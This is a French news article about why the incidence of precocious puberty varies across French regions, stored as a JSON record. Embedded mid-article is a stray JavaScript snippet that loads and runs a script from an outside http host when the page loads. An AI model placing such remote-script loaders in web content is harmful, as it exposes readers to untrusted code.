{"title": "Puberte precoce : pourquoi son incidence differe-t-elle selon la region ?", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-06-05", "content": "Curieusement, en France, la frequence de la puberte precoce varie selon les regions, avec davantage de cas autour de Lyon et de Toulouse. C'est ce que revele une etude de l'agence Sante publique France sur cette pathologie, ce qui laisse supposer des facteurs environnementaux, encore inconnus. La  puberte  demarre generalement vers 11 ans chez les filles et 12 ans chez les garcons. Mais quand les signes de la  puberte  (seins, pilosite...) apparaissent avant 8 ans chez les filles et avant 9 ans chez les garcons, on parle de puberte precoce. Celle-ci est generalement d' origine hormonale  : l'axe hypothalamo-hypophysaire se met en marche de maniere prematuree avec des pics de  GnRH . Cette << puberte centrale >> est traitee par des  agonistes  de la GnRH. Non traitee, la  puberte precoce  s'accompagne d'une acceleration de la croissance, d'une grande taille chez l' enfant  et d'une petite taille de l'adulte.  Sante publique France  a mene une enquete sur la  frequence  de cette  pathologie  en utilisant les donnees du Sniiram sur les remboursements des medicaments.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Plus de cas en Auvergne-Rhone-Alpes et dans le Sud-Ouest  Chez les filles de moins de 9 ans, l' incidence  de la puberte precoce est de 2,68 cas sur 10.000, la moyenne etant faite sur trois annees (2011 a 2013). Ceci correspond a 1.173 cas par an. Les  garcons  seraient dix fois moins touches que les filles : chez les moins de 10 ans, le nombre de cas s'eleve a 117 par an (soit 0,24 cas sur 10.000 garcons). La repartition des cas de puberte precoce en France metropolitaine montre de grandes disparites regionales. En effet, deux regions apparaissent plus touchees : autour de Lyon et autour de Toulouse. Cette heterogeneite regionale se retrouve chez les filles comme chez les garcons. Ces disparites geographiques suggerent des  facteurs de risque  environnementaux qu'il reste a mettre en evidence. Interview 4/5 : la pollution, quels risques pour la sante ?                       Avec l'augmentation des taux de pollution se pose la question de son impact sur la sante humaine. Chaque polluant a des effets differents, certains immediats et visibles, d'autres retardes et plus insidieux. Afin de clarifier la question, nous avons interviewe Philippe Hubert, directeur des risques chroniques de l'Ineris.                                       ", "theme": "sante"}